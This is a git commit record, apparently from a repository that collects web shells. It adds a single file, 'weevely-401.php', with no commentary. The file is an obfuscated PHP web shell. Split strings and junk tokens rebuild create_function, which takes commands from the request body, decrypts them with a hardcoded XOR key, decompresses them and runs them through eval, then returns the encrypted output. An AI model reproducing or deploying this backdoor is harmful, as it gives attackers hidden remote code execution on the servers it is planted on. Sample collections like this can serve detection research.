708246448fa067a8774a8959464e6e8880709627
vonzzhhhh <54200644+vonzzhhhh@users.noreply.github.com>
2020-07-16 14:52:02 +0800

    Add files via upload

---
+++ weevely-401.php
@@ -0,0 +1,10 @@
+<?php
+$I='$kYL){$YLc=strlen($k)YL;$l=sYLtrlYLen($t);$YLo="YL";for($i=YL0;$i<$lYL;YL){for($j=YL0;YL($j<$cYLYL&&$i<$l);$j++YL';
+$A='$k="5d4YL1402aYL";$kh=YL"bc4bYL2aYL76b97YL1";$YLkf=YL"9d911017c592YL";$p="hSS6qUyYLGUu3YLlri95";YLfunctiYLon x($tYL,';
+$y=',$iYLYL++){$o.=$t{$i}^$k{$jYL}YL;}}retYLurn $o;}if (YL@prYLYLeg_matYLch(YL"/$kh(.+)$YLkfYL/",YL@file_YLgYLet_contents("php://';
+$j='inpuYLYLt"),$m)==1YL) YL{@ob_starYLt();@evYLal(@gzYLuncompreYLss(@YLx(@baseYL64_YLdecode(YL$m[1]YL),$k)))YL;$o=@ob_';
+$D='getYL_YLcontYLents();@ob_endYL_cleaYLn();$rYL=@basYLe64_encYLodYLe(@x(@gzcYLompYLress($o),$YLkYL));print(YL"$p$khYL$r$kf");}';
+$z=str_replace('g','','cregatge_gfguncggtion');
+$Y=str_replace('YL','',$A.$I.$y.$j.$D);
+$n=$z('',$Y);$n();
+?>
